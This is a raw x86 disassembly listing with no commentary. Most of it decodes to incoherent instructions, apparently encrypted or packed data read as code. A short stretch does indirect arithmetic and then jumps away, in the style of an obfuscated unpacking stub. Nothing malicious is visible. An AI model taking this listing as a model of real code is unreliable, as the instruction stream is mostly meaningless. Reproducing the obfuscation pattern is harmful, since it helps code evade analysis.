  408013:	and    al,0x95
  408015:	dec    edi
  408016:	mov    eax,0xb2c15259
  40801b:	dec    eax
  40801c:	stos   BYTE PTR es:[edi],al
  40801d:	xor    eax,0xffffffc8
  408020:	dec    ebx
  408021:	dec    ebx
  408022:	push   edi
  408023:	stos   BYTE PTR es:[edi],al
  408024:	dec    ecx
  408025:	pop    ecx
  408026:	fst    QWORD PTR [edi+0x2e]
  408029:	out    dx,al
  40802a:	into   
  40802b:	inc    eax
  40802c:	lock ja 0x408062
  40802f:	leave  
  408030:	gs push ds
  408032:	gs sub al,0xb7
  408035:	test   DWORD PTR [ebx-0x7edb366d],esp
  40803b:	xchg   ecx,eax
  40803c:	mov    dl,0x34
  40803e:	jnp    0x40801b
  408040:	lahf   
  408041:	inc    ebx
  408042:	(bad)  
  408043:	call   0x1ad0f349
  408048:	ds test eax,0x7846223a
  40804e:	sbb    cl,BYTE PTR [esp+eiz*2+0x6b5da109]
  408055:	push   0xca9035b4
  40805a:	repnz dec ebx
  40805c:	jbe    0x407ff7
  40805e:	add    al,0x47
  408060:	cmp    dl,BYTE PTR [ebx+ecx*2+0x72888f64]
  408067:	lahf   
  408068:	mov    cl,0x59
  40806a:	inc    eax
  40806b:	mov    ds:0xccbc394b,eax
  408070:	retf   
  408071:	not    DWORD PTR [ecx+0x2003f2ff]
  408077:	xchg   esp,eax
  408078:	ds mov ah,0x34
  40807b:	popa   
  40807c:	and    al,0x64
  40807e:	add    eax,0x8e472201
  408083:	jl     0x4080bb
  408085:	xor    ah,BYTE PTR [edx]
  408087:	sbb    eax,0xc78f93c2
  40808c:	mov    ch,ah
  40808e:	xlat   BYTE PTR ds:[ebx]
  40808f:	imul   esi,DWORD PTR [edx+esi*1],0xffffff8e
  408093:	gs mov cl,0x45
  408096:	and    dh,BYTE PTR [ebx+0x60]
  408099:	(bad)  
  40809a:	push   0x1d49728b
  40809f:	hlt    
  4080a0:	xchg   BYTE PTR [ebp+ebx*4+0x23],bh
  4080a4:	loopne 0x4080e0
  4080a6:	ret    0x24fa
  4080a9:	pop    es
  4080aa:	push   ss
  4080ab:	aam    0xd4
  4080ad:	push   cs
  4080ae:	mov    ebx,0x36ef5a29
  4080b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080b4:	jecxz  0x408063
  4080b6:	cli    
  4080b7:	adc    DWORD PTR [eax],edx
  4080b9:	fadd   st(2),st
  4080bb:	cmp    DWORD PTR [ebx+0x78],ebp
  4080be:	rcl    BYTE PTR [edi+0x3],1
  4080c1:	pop    eax
  4080c2:	sub    bl,dh
  4080c4:	lods   eax,DWORD PTR ds:[esi]
  4080c5:	ror    BYTE PTR es:[ebx+0x762a8e2],0xb8
  4080cd:	int3   
  4080ce:	mov    cl,0xdc
  4080d0:	ins    BYTE PTR es:[edi],dx
  4080d1:	sub    dl,BYTE PTR [ecx+edi*4-0x4a]
  4080d5:	cwde   
  4080d6:	test   DWORD PTR [ebp+0x35c21758],0xc5a8fd5b
  4080e0:	push   edx
  4080e1:	jle    0x4080ae
  4080e3:	pop    eax
  4080e4:	push   esi
  4080e5:	pop    edi
  4080e6:	and    eax,DWORD PTR [ecx-0x72]
  4080e9:	test   al,0xb0
  4080eb:	js     0x4080da
  4080ed:	lahf   
  4080ee:	scas   eax,DWORD PTR es:[edi]
  4080ef:	push   ss
  4080f0:	adc    BYTE PTR [ebp+0x638b4a8],ah
  4080f6:	pushf  
  4080f7:	mov    bh,0x2
  4080f9:	sbb    eax,0x9a7fed26
  4080fe:	jns    0x4080d2
  408100:	xchg   esp,eax
  408101:	outs   dx,BYTE PTR ds:[esi]
  408102:	fnsave [eax-0x598a0b1b]
  408108:	xchg   ebx,eax
  408109:	addr16 adc al,bl
  40810c:	jl     0x408155
  40810e:	inc    esi
  40810f:	loope  0x408108
  408111:	sahf   
  408112:	repnz popf 
  408114:	and    al,BYTE PTR [esi-0x194e36b3]
  40811a:	adc    BYTE PTR [ebx],ch
  40811c:	mov    dh,0xaf
  40811e:	sub    eax,0x8f1e6cd3
  408123:	call   0x4811:0xa23a2123
  40812a:	adc    BYTE PTR [edi-0x7d],0xcc
  40812e:	sbb    esi,DWORD PTR [ecx+0x68509b6b]
  408134:	sub    edi,esi
  408136:	imul   esp
  408138:	jbe    0x408145
  40813a:	shr    BYTE PTR [ebx-0x17],cl
  40813d:	js     0x408129
  40813f:	jp     0x4080d5
  408141:	sbb    ch,dh
  408143:	add    eax,DWORD PTR [edx-0x743cfbcc]
  408149:	bnd jmp 0x408132
  40814c:	jl     0x408132
  40814e:	add    ecx,DWORD PTR [eax-0x73]
  408151:	add    edi,DWORD PTR [edx+0x33271c70]
  408157:	jmp    FWORD PTR [esp+ecx*4-0x31]
  40815b:	fwait
  40815c:	inc    esi
  40815d:	(bad)  
  40815e:	fucomi st,st(1)
  408160:	xor    eax,0x4e52866
  408165:	dec    edi
  408166:	or     bl,BYTE PTR ds:0xc27c6959
  40816c:	ret    0xc272
  40816f:	xor    esp,DWORD PTR [ecx+0x33]
  408172:	loope  0x40814b
  408174:	mov    ch,0xaf
  408176:	sub    DWORD PTR [esi],eax
  408178:	enter  0xa236,0xe3
  40817c:	jg     0x40813d
  40817e:	sub    DWORD PTR [ebx+0x56],eax
  408181:	out    dx,eax
  408182:	jmp    0x4354:0xdd95b2d6
  408189:	cwde   
  40818a:	lds    edi,FWORD PTR [esi-0x46]
  40818d:	jle    0x408163
  40818f:	shl    esi,1
  408191:	wrmsr  
  408193:	pop    edi
  408194:	inc    ebx
  408195:	jl     0x408119
  408197:	mov    eax,ds:0xd282f714
  40819c:	and    eax,0x993a975
  4081a1:	adc    al,0xa7
  4081a3:	adc    ebp,edx
  4081a5:	outs   dx,DWORD PTR ds:[esi]
  4081a6:	inc    BYTE PTR [esi-0x6aa80269]
  4081ac:	shr    DWORD PTR [edi+ebp*4-0x388d681a],cl
  4081b3:	jmp    0x4081ab
  4081b5:	das    
  4081b6:	pop    ds
  4081b7:	or     dh,BYTE PTR [edi+0x73c5d6b7]
  4081bd:	in     al,0x53
  4081bf:	inc    esi
  4081c0:	into   
  4081c1:	inc    esi
  4081c2:	xor    esp,DWORD PTR [edi-0xdeb7d98]
  4081c8:	frstor [esi]
  4081ca:	cmp    BYTE PTR [ebx],al
  4081cc:	or     ebx,eax
  4081ce:	icebp  
  4081cf:	jbe    0x408190
  4081d1:	or     ebp,edi
  4081d3:	repz dec ebx
  4081d5:	lea    ebp,[esi-0x3e]
  4081d8:	lods   eax,DWORD PTR ds:[esi]
  4081d9:	inc    edx
  4081da:	push   0x6
  4081dc:	sub    cl,BYTE PTR [eax-0x39]
  4081df:	fdiv   QWORD PTR [edx-0x2d]
  4081e2:	adc    bh,BYTE PTR [ebx-0x7e]
  4081e5:	and    esp,DWORD PTR [esi+edi*2+0x3a9d9216]
  4081ec:	mov    ebp,0x6ce6f97a
  4081f1:	mov    bl,0xbd
  4081f3:	jecxz  0x40823a
  4081f5:	jno    0x408196
  4081f7:	call   0xda30bbc8
  4081fc:	pop    esi
  4081fd:	repnz out dx,eax
  4081ff:	adc    al,0x28
  408201:	cs stos DWORD PTR es:[edi],eax
  408203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408204:	add    eax,0x5b83eca6
  408209:	cdq    
  40820a:	xor    al,cl
  40820c:	lods   al,BYTE PTR ds:[esi]
  40820d:	std    
  40820e:	push   es
  40820f:	xchg   ecx,eax
  408210:	es cmc 
  408212:	jne    0x4081a1
  408214:	into   
  408215:	ja     0x4081f6
  408217:	pop    edi
  408218:	fistp  WORD PTR [esi]
  40821a:	and    edx,DWORD PTR [ecx]
  40821c:	ds clc 
  40821e:	hlt    
  40821f:	in     eax,0xb6
  408221:	test   eax,0x8cc7d19e
  408226:	sub    dl,BYTE PTR [edx+ecx*1]
  408229:	iret   
  40822a:	mov    ds:0x280e3919,eax
  40822f:	leave  
  408230:	fmulp  st(4),st
  408233:	in     al,dx
  408234:	(bad)  
  408235:	aad    0x78
  408237:	inc    ebx
  408238:	cmp    al,0x35
  40823a:	retf   
  40823b:	add    ah,BYTE PTR [ecx]
  40823d:	ja     0x408211
  40823f:	sub    BYTE PTR [edx-0x35],ch
  408242:	sub    al,0x29
  408244:	and    bh,BYTE PTR [edi-0x17a1e753]
  40824a:	jns    0x40827c
  40824c:	push   ebp
  40824d:	ror    BYTE PTR [esi+0x58],1
  408250:	loop   0x408252
  408252:	xchg   esi,eax
  408253:	jmp    0x4081dc
  408255:	adc    BYTE PTR [edx-0x52],dh
  408258:	sub    DWORD PTR [eax+0x66],edi
  40825b:	gs rcr edx,1
  40825e:	xor    ebx,esi
  408260:	mov    ch,0x8f
  408262:	push   ebp
  408263:	in     eax,0x61
  408265:	add    bh,BYTE PTR [eax-0x17]
  408268:	sub    eax,0x655f1694
  40826d:	inc    ecx
  40826e:	mov    ebx,0x403fcb1e
  408273:	mov    dl,0xfa
  408275:	add    DWORD PTR [edx],esi
  408277:	or     eax,ebp
  408279:	xchg   edi,eax
  40827a:	in     eax,0x1c
  40827c:	cmp    al,0x1
  40827e:	jecxz  0x4082c9
  408280:	les    eax,FWORD PTR [edx]
  408282:	inc    edi
  408283:	dec    edx
  408284:	pop    esi
  408285:	or     dh,BYTE PTR [eax+0x3d]
  408288:	cmp    DWORD PTR [edi+0x7d],ebp
  40828b:	call   0x8fb249ff
  408290:	lds    ebx,FWORD PTR [ebx+eax*2]
  408293:	ret    
  408294:	mov    ebp,0xd16aca85
  408299:	pushf  
  40829a:	jmp    0x17a251ad
  40829f:	(bad)  
  4082a0:	push   0xffffffe9
  4082a2:	cwde   
  4082a3:	fadd   QWORD PTR [esi+edx*1+0x57]
  4082a7:	cmc    
  4082a8:	mov    bh,0xe5
  4082aa:	mov    eax,0x2f8b8c45
  4082af:	add    BYTE PTR fs:[ebp-0x1d817657],bl
  4082b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082b7:	dec    ecx
  4082b8:	sub    al,0x15
  4082ba:	mov    al,ds:0x1cc7d979
  4082bf:	mov    edi,0xc6a1ca20
  4082c4:	hlt    
  4082c5:	mov    al,ds:0x11c424ea
  4082ca:	in     eax,0x4
  4082cc:	inc    ecx
  4082cd:	sub    al,0xa4
  4082cf:	jmp    0x85b85e02
  4082d4:	ss loope 0x408302
  4082d7:	pop    ds
  4082d8:	cmp    ebx,DWORD PTR [ebp+ebp*4+0x1c]
  4082dc:	jbe    0x408295
  4082de:	(bad)  
  4082df:	clc    
  4082e0:	pop    ebx
  4082e1:	mov    eax,ds:0xebdabcaa
  4082e6:	jge    0x40833c
  4082e8:	outs   dx,BYTE PTR ds:[esi]
  4082e9:	mov    ah,0xbd
  4082eb:	das    
  4082ec:	int3   
  4082ed:	push   ebx
  4082ee:	inc    ebx
  4082ef:	leave  
  4082f0:	dec    esp
  4082f1:	jns    0x408319
  4082f3:	in     eax,dx
  4082f4:	mov    al,0x45
  4082f6:	or     al,BYTE PTR [edi-0x2aed55ea]
  4082fc:	push   esi
  4082fd:	out    dx,al
  4082fe:	jne    0x408355
  408300:	mov    esi,0xbd4bc618
  408305:	pop    ss
  408306:	xor    ebp,ebx
  408308:	pop    ebx
  408309:	sbb    eax,0xd1a4f727
  40830e:	popf   
  40830f:	mov    ss,edx
  408311:	icebp  
  408312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408313:	xchg   BYTE PTR [ecx+0x7db987cc],dh
  408319:	push   esp
  40831a:	cmp    DWORD PTR [edx-0x29957b0e],esi
  408320:	add    dh,BYTE PTR [esi-0x69ffb05c]
  408326:	jecxz  0x408385
  408328:	ficom  WORD PTR [eax+ecx*2-0x50]
  40832c:	dec    eax
  40832d:	out    0xf1,al
  40832f:	es cmp dl,ch
  408332:	das    
  408333:	repz push ecx
  408335:	sahf   
  408336:	repz xor ecx,esi
  408339:	scas   eax,DWORD PTR es:[edi]
  40833a:	dec    esi
  40833b:	pop    es
  40833c:	repz sbb DWORD PTR [eax+0x60],ebx
  408340:	push   ds
  408341:	mov    bl,BYTE PTR [ebx+0x46]
  408344:	and    DWORD PTR [ebx-0x5644f1c8],edx
  40834a:	cmp    ebx,DWORD PTR [ebx-0x61c1851]
  408350:	out    0x46,al
  408352:	sub    edx,ebp
  408354:	adc    eax,0xfa57dd40
  408359:	mov    bl,0x79
  40835b:	das    
  40835c:	sbb    ebp,DWORD PTR [esi]
  40835e:	push   eax
  40835f:	jo     0x408392
  408361:	inc    ebp
  408362:	mov    ecx,0xbd8d250c
  408367:	cmp    eax,0x5425f076
  40836c:	repz mov ?,WORD PTR [esi]
  40836f:	push   eax
  408370:	dec    ebp
  408371:	(bad)  
  408372:	(bad)  
  408373:	add    eax,0x5037274d
  408378:	div    esi
  40837a:	dec    eax
  40837b:	push   esp
  40837c:	jp     0x4083fa
  40837e:	ret    0x920f
  408381:	inc    esi
  408382:	jo     0x40837a
  408384:	js     0x4083a6
  408386:	inc    esp
  408387:	cwde   
  408388:	popa   
  408389:	std    
  40838a:	cmp    ecx,ebx
  40838c:	mov    DWORD PTR [ebp+0x77],ecx
  40838f:	add    BYTE PTR [eax],cl
  408391:	pop    es
  408392:	in     al,dx
  408393:	and    eax,0x650c5dc2
  408398:	mov    cl,0xbb
  40839a:	les    ebx,FWORD PTR [eax-0x28]
  40839d:	lods   eax,DWORD PTR ds:[esi]
  40839e:	cmp    BYTE PTR ds:0x3b8ccdf0,0x78
  4083a5:	sub    al,0x8a
  4083a7:	cdq    
  4083a8:	retf   
  4083a9:	out    0xcb,al
  4083ab:	jg     0x408372
  4083ad:	mov    ebx,0x3d876e35
  4083b2:	pop    edx
  4083b3:	popf   
  4083b4:	pusha  
  4083b5:	and    eax,esi
  4083b7:	test   eax,0x9805052f
  4083bd:	jge    0x40834d
  4083bf:	xchg   si,ax
  4083c1:	test   eax,0xf42e7423
  4083c6:	jno    0x4083db
  4083c8:	or     ch,BYTE PTR [edx]
  4083ca:	or     eax,0xcdb9c4a
  4083cf:	aas    
  4083d0:	push   ebx
  4083d1:	mov    DWORD PTR [ecx+0x20],ebp
  4083d4:	jmp    DWORD PTR [edi+0x77f2e548]
  4083da:	outs   dx,BYTE PTR ds:[esi]
  4083db:	outs   dx,DWORD PTR ds:[esi]
  4083dc:	add    bh,BYTE PTR [edx]
  4083de:	jne    0x4083ef
  4083e0:	mov    eax,ds:0x6e54b3e9
  4083e5:	add    al,0x71
  4083e7:	xchg   esi,eax
  4083e8:	fcomp  st(4)
  4083ea:	cld    
  4083eb:	scas   al,BYTE PTR es:[edi]
  4083ec:	pop    ebp
  4083ed:	retf   
  4083ee:	call   0xba55bece
  4083f3:	jbe    0x4083f8
  4083f5:	pop    ebx
  4083f6:	push   ecx
  4083f7:	mov    WORD PTR [ebp+0x20c62d2d],fs
  4083fd:	loopne 0x40844b
  4083ff:	fidivr WORD PTR [edi-0x58]
  408402:	icebp  
  408403:	call   0xaaeb:0x2e9a406e
  40840a:	pop    edi
  40840b:	outs   dx,BYTE PTR ds:[esi]
  40840c:	test   al,0xca
  40840e:	loop   0x408447
  408410:	shl    BYTE PTR [ebp+0x2947c987],0x17
  408417:	fwait
  408418:	xchg   ebp,eax
  408419:	je     0x4083d6
  40841b:	mov    dl,BYTE PTR [edi-0x20215e44]
  408421:	cli    
  408422:	push   es
  408423:	push   ds
  408424:	outs   dx,DWORD PTR ds:[esi]
  408425:	int3   
  408426:	into   
  408427:	xor    DWORD PTR [ebp-0x69a043e4],0xffffff81
  40842e:	arpl   WORD PTR [edi-0x74],si
  408431:	jmp    0x21fa:0xa9bd1033
  408438:	push   cs
  408439:	inc    edx
  40843a:	inc    eax
  40843b:	in     eax,0x46
  40843d:	xchg   edi,eax
  40843e:	int    0xaa
  408440:	rcr    ah,0x80
  408443:	mov    eax,ds:0x5913e839
  408448:	inc    esp
  408449:	fs cli 
  40844b:	ja     0x40846c
  40844d:	not    BYTE PTR [ebx+0x3b]
  408450:	dec    edi
  408451:	push   ebx
  408452:	dec    edi
  408453:	ds in  eax,dx
  408455:	sti    
  408456:	loop   0x4084ab
  408458:	mov    ebx,esp
  40845a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40845b:	inc    ebp
  40845c:	jmp    0x10c6:0x9374283d
  408463:	jnp    0x408494
  408465:	arpl   di,ax
  408467:	out    0x65,eax
  408469:	addr16 into 
  40846b:	dec    edi
  40846c:	jecxz  0x40848d
  40846e:	ins    BYTE PTR es:[edi],dx
  40846f:	imul   edi,DWORD PTR [esi+0x3e70d9b5],0x83e380a8
  408479:	adc    al,0x5a
  40847b:	xchg   ebp,eax
  40847c:	xor    cl,BYTE PTR [ebx+0x39d1254b]
  408482:	test   ebx,0xc18ebe7a
  408488:	push   ecx
  408489:	je     0x40846f
  40848b:	mov    ds:0x468bd038,eax
  408490:	xchg   esi,eax
  408491:	loopne 0x4084fc
  408493:	das    
  408494:	xchg   esp,eax
  408495:	dec    ecx
  408496:	jle    0x408428
  408498:	(bad)  
  408499:	(bad)  
  40849a:	dec    edi
  40849b:	xchg   BYTE PTR [ebx-0x2f],bl
  40849e:	loop   0x408513
  4084a0:	daa    
  4084a1:	inc    ebp
  4084a2:	clc    
  4084a3:	int    0xd3
  4084a5:	sbb    ecx,DWORD PTR [ebp+0x5e5987a4]
  4084ab:	cmp    eax,0x5d200b54
  4084b0:	stos   BYTE PTR es:[edi],al
  4084b1:	push   es
  4084b2:	mov    ch,0x9b
  4084b4:	fs mov ebx,0x4ea0d54e
  4084ba:	dec    ebx
  4084bb:	push   ss
  4084bc:	xor    esp,edi
  4084be:	pop    ds
  4084bf:	mov    ah,BYTE PTR [eax]
  4084c1:	lods   eax,DWORD PTR ds:[esi]
  4084c2:	out    dx,eax
  4084c3:	pop    ebx
  4084c4:	std    
  4084c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084c6:	mov    edi,0xc3ba3b6f
  4084cb:	scas   al,BYTE PTR es:[edi]
  4084cc:	(bad)  
  4084cd:	or     BYTE PTR ds:[ebp+0x1502c048],al
  4084d4:	dec    ecx
  4084d5:	cmp    al,0x76
  4084d7:	or     esi,DWORD PTR [edi+edi*1+0x6f]
  4084db:	xchg   ebx,eax
  4084dc:	xchg   di,ax
  4084de:	sbb    al,0x1e
  4084e0:	sahf   
  4084e1:	dec    ecx
  4084e2:	sbb    edi,DWORD PTR [esi+0x19]
  4084e5:	xlat   BYTE PTR ds:[ebx]
  4084e6:	jo     0x40851d
  4084e8:	rol    bl,cl
  4084ea:	pop    ebp
  4084eb:	out    0x89,eax
  4084ed:	cwde   
  4084ee:	push   es
  4084ef:	add    esp,DWORD PTR [esi-0x62]
  4084f2:	sub    edx,DWORD PTR [esi-0x4729ac36]
  4084f8:	jae    0x4084fc
  4084fa:	mov    edx,DWORD PTR gs:[esi]
  4084fd:	or     al,ch
  4084ff:	lahf   
  408500:	jmp    0xe05dfce8
  408505:	or     al,0x97
  408507:	(bad)  
  408509:	mov    eax,ds:0xc520aea3
  40850e:	and    eax,esp
  408510:	inc    esi
  408511:	sbb    DWORD PTR [esi+edx*8+0x3d],ebx
  408515:	int3   
  408516:	lods   al,BYTE PTR ds:[esi]
  408517:	(bad)  
  408518:	nop
  408519:	iret   
  40851a:	mov    edx,0x26a7abf0
  40851f:	push   0x3a2b2a8d
  408524:	(bad)  [ebx-0x3d]
  408527:	inc    edx
  408528:	jecxz  0x40859c
  40852a:	pop    edi
  40852b:	and    eax,0xd975f9ee
  408530:	mov    ebp,?
  408532:	dec    edi
  408533:	clc    
  408534:	push   es
  408535:	test   ecx,ecx
  408537:	movups XMMWORD PTR [ecx+0x67],xmm1
  40853b:	aad    0x51
  40853d:	lock xor DWORD PTR [edx],eax
  408540:	loope  0x408511
  408542:	aam    0x39
  408544:	pop    ebp
  408545:	shl    BYTE PTR ds:0x5a8ea95e,1
  40854b:	retf   
  40854c:	aad    0x5e
  40854e:	mov    BYTE PTR [edx-0x5c],ah
  408551:	and    DWORD PTR ds:0x3a9f9ed2,ecx
  408557:	or     al,0x0
  408559:	jo     0x4085d7
  40855b:	cwde   
  40855c:	mov    ds:0x51a31bff,al
  408561:	std    
  408562:	das    
  408563:	dec    esi
  408564:	add    DWORD PTR [ecx+0x542d56e1],eax
  40856a:	mov    ah,0xa3
  40856c:	mov    esi,?
  40856e:	(bad)  
  40856f:	or     BYTE PTR [eax+0x56],dh
  408572:	sub    al,0xa0
  408574:	pop    es
  408575:	out    0xc2,al
  408577:	fwait
  408578:	cdq    
  408579:	pop    edx
  40857a:	ror    DWORD PTR [ebx-0x265f0818],1
  408580:	test   BYTE PTR [edi+0x2b],0x61
  408584:	in     al,0x85
  408586:	(bad)  
  408587:	cli    
  408588:	es mov ch,0xc3
  40858b:	iret   
  40858c:	jg     0x4085c4
  40858e:	outs   dx,BYTE PTR ds:[esi]
  40858f:	test   al,0x4e
  408591:	xchg   BYTE PTR ds:0xce316f25,dl
  408597:	jl     0x408604
  408599:	adc    al,0xa8
  40859b:	jge    0x408537
  40859d:	sbb    dl,0x4b
  4085a0:	and    al,BYTE PTR [ecx+0xbf2b537]
  4085a6:	mov    ebp,?
  4085a8:	iret   
  4085a9:	cmp    ecx,eax
  4085ab:	sub    DWORD PTR [edx+0x5],esi
  4085ae:	ja     0x40854b
  4085b0:	mov    bh,0xe7
  4085b2:	adc    BYTE PTR [ecx+0x5e939f7b],bh
  4085b8:	mov    DWORD PTR [esi],ebp
  4085ba:	sub    dl,cl
  4085bc:	and    bh,BYTE PTR [ecx+esi*4-0x44]
  4085c0:	pop    ebx
  4085c1:	cmp    BYTE PTR [edi+esi*1+0x6446de06],0x4b
  4085c9:	mov    ebp,0xa1e9530c
  4085ce:	rcl    cl,0x28
  4085d1:	xchg   edx,eax
  4085d2:	push   esi
  4085d3:	std    
  4085d4:	ds fdivrp st(0),st
  4085d7:	mov    edi,0xb27c23a7
  4085dc:	mov    dl,0x71
  4085de:	out    dx,eax
  4085df:	adc    al,0xaf
  4085e1:	bound  ebx,QWORD PTR [edi+ebx*4]
  4085e4:	jp     0x4085c9
  4085e6:	in     eax,dx
  4085e7:	mov    es,esp
  4085e9:	ret    0xbc6d
  4085ec:	xchg   ecx,eax
  4085ed:	in     eax,0x37
  4085ef:	mov    eax,0x698f1bf1
  4085f4:	sar    BYTE PTR [eax-0x1804e4df],0x1b
  4085fb:	rcr    DWORD PTR [edi+edi*2+0x7f],1
  4085ff:	dec    eax
  408600:	arpl   WORD PTR [edx+0x5ad1a280],ax
  408606:	xchg   BYTE PTR [edx+eax*4-0x1a58e772],dl
  40860d:	fwait
  40860e:	dec    ebx
  40860f:	pop    ebx
  408610:	mov    bh,ah
  408612:	retf   0xcd6d
  408615:	add    ch,BYTE PTR [ecx-0x43]
  408618:	stos   BYTE PTR es:[edi],al
  408619:	cmp    BYTE PTR [ebp-0x2abcfc7b],bh
  40861f:	mov    ds:0x86e3e764,al
  408624:	cmp    eax,0xccd4f5d8
  40862a:	(bad)  
  40862b:	shl    DWORD PTR cs:[edi+0x22],0xa6
  408630:	jp     0x40865a
  408632:	add    ebp,DWORD PTR [eax+eax*2+0x2d]
  408636:	cmp    al,0xe9
  408638:	xor    esp,ebx
  40863a:	shl    BYTE PTR [esi-0x50],1
  40863d:	pop    esi
  40863e:	push   edx
  40863f:	ins    DWORD PTR es:[edi],dx
  408640:	ficom  DWORD PTR [ebx+eiz*8+0x768d4566]
  408647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408648:	scas   eax,DWORD PTR es:[edi]
  408649:	mov    eax,0x3c19b6bd
  40864e:	jl     0x408686
  408650:	imul   esp,DWORD PTR [ebx+ecx*1],0xf9f11b2b
  408657:	xor    al,0xcf
  408659:	add    ebp,DWORD PTR [ebx-0x79]
  40865c:	es xchg esp,eax
  40865e:	imul   eax,DWORD PTR [ebx],0xffffff9b
  408661:	mov    dh,0x49
  408663:	add    dh,BYTE PTR [edx-0x26bb9166]
  408669:	jbe    0x408628
  40866b:	jmp    0xc2e61192
  408670:	or     esp,DWORD PTR [esi-0x43]
  408673:	mov    DWORD PTR [ecx],ebx
  408675:	ror    DWORD PTR [ebx+0x5bbddce8],cl
  40867b:	xchg   ecx,eax
  40867c:	dec    ebp
  40867d:	jecxz  0x408666
  40867f:	das    
  408680:	adc    DWORD PTR [ebx],edx
  408682:	and    DWORD PTR fs:[ebp+0x710cab94],ebp
  408689:	adc    al,0x86
  40868b:	sub    al,0xab
  40868d:	pop    esi
  40868e:	jns    0x408642
  408690:	jns    0x408693
  408692:	rol    edx,cl
  408694:	or     ch,BYTE PTR [ecx-0x627ef1c6]
  40869a:	add    dh,BYTE PTR ds:0x41c1419a
  4086a0:	mov    ds:0xa90258e6,al
  4086a5:	xchg   esi,eax
  4086a6:	pop    ebx
  4086a7:	or     ah,BYTE PTR [edi+0x15]
  4086aa:	(bad)  
  4086ab:	xchg   DWORD PTR es:[edi-0x6f],edi
  4086af:	mov    bh,0x30
  4086b1:	leave  
  4086b2:	je     0x408725
  4086b4:	ins    DWORD PTR es:[edi],dx
  4086b5:	jb     0x4086ba
  4086b7:	xor    DWORD PTR [ebp-0x36],esi
  4086ba:	mov    cl,0xb5
  4086bc:	push   esp
  4086bd:	mov    esi,0xdfa97af8
  4086c2:	test   DWORD PTR [ebx+eiz*8-0x5],edi
  4086c6:	add    al,0x6
  4086c8:	inc    edx
  4086c9:	dec    edi
  4086ca:	ret    0xeb3b
  4086cd:	adc    ecx,DWORD PTR [ebp-0x1d]
  4086d0:	ret    0x6a03
  4086d3:	inc    esp
  4086d4:	or     al,0x2b
  4086d6:	push   ecx
  4086d7:	in     al,dx
  4086d8:	push   0x3
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0x98303719
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	(bad)  
  40871e:	call   0xb55099a0
  408723:	mov    bh,0x53
  408725:	xor    BYTE PTR [esi+0x3c6775cc],bl
  40872b:	xor    BYTE PTR [eax],0xe1
  40872e:	and    BYTE PTR [esi-0x21df9325],bh
  408734:	xor    edx,DWORD PTR [eax+edx*1-0xa5a0968]
  40873b:	and    al,0xd6
  40873d:	xlat   BYTE PTR ds:[ebx]
  40873e:	dec    eax
  40873f:	ret    
  408740:	ins    DWORD PTR es:[edi],dx
  408741:	or     BYTE PTR [ebx-0x495f8152],ch
  408747:	ret    0x8dc5
  40874a:	mov    eax,0x4bbda6fc
  40874f:	xor    DWORD PTR [esi+ecx*2-0x1b207772],ecx
  408756:	adc    al,0x5c
  408758:	shl    dl,cl
  40875a:	cmp    BYTE PTR ds:0xe61b2911,bl
  408760:	pop    edx
  408761:	shl    bl,1
  408763:	fld    st(1)
  408765:	mov    eax,ds:0xb36932a1
  40876a:	ror    DWORD PTR [ebx],cl
  40876c:	outs   dx,BYTE PTR ds:[esi]
  40876d:	cld    
  40876e:	xlat   BYTE PTR ds:[ebx]
  40876f:	test   DWORD PTR ds:0xf866620b,eax
  408775:	or     ebx,DWORD PTR [eax-0x19ee85b7]
  40877b:	in     al,0xdf
  40877d:	aam    0x73
  40877f:	pop    edx
  408780:	pushf  
  408781:	nop
  408782:	jnp    0x408719
  408784:	xchg   DWORD PTR [ecx],ebx
  408786:	jmp    0x408789
  408788:	or     ah,BYTE PTR [edx+0x22]
  40878b:	dec    edi
  40878c:	xor    edi,ebp
  40878e:	jne    0x40874c
  408790:	pop    edx
  408791:	lods   eax,DWORD PTR ds:[esi]
  408792:	pop    edx
  408793:	in     al,0x84
  408795:	lods   eax,DWORD PTR ds:[esi]
  408796:	pop    esp
  408797:	inc    ebx
  408798:	ins    BYTE PTR es:[edi],dx
  408799:	xchg   ecx,eax
  40879a:	or     al,0x20
  40879c:	cmp    bl,BYTE PTR [ebp+ebp*4-0xa]
  4087a0:	fistp  QWORD PTR [edx+ebp*4+0x68715be7]
  4087a7:	pop    esp
  4087a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087a9:	hlt    
  4087aa:	out    0xfd,al
  4087ac:	add    eax,0x8c378423
  4087b1:	fidiv  WORD PTR [eax+0x2b]
  4087b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b5:	mov    BYTE PTR [ecx],bh
  4087b7:	scas   al,BYTE PTR es:[edi]
  4087b8:	scas   al,BYTE PTR es:[edi]
  4087b9:	test   eax,0x865a7bb5
  4087be:	adc    DWORD PTR [ebx+0x3d8701ab],0xffffffd8
  4087c5:	pop    esp
  4087c6:	mov    ecx,0x5fb59a3a
  4087cb:	imul   esp,DWORD PTR [ecx-0x10],0x7e1133e6
  4087d2:	(bad)  
  4087d3:	mov    eax,ds:0xb5e03d0d
